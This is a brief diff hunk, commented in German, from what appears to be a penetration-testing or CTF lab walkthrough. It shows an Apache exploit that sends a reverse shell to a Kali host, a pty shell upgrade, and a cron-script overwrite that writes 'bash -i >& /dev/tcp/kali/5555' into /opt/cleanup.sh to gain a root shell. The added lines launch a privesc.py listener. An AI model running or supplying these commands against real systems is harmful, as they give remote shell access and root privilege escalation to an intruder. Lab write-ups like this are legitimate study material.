@@ -73,6 +73,8 @@ in/sh" # Apache exploit senden, sendet Reverse Shell an Kali:4444
 python3 -c 'import pty; pty.spawn("/bin/bash")' # Upgrade zu einer fähigeren Shell
 
 #cron überschreiben
+python3 privesc.py #im extra Terminal starten um auf die root shell zu warten
+
 send_command(www_shell, f"echo '#!/bin/bash' > /opt/cleanup.sh")
 send_command(www_shell, f"echo 'bash -i >& /dev/tcp/kali/5555 0>&1' >> /opt/cleanup.sh")
 ```
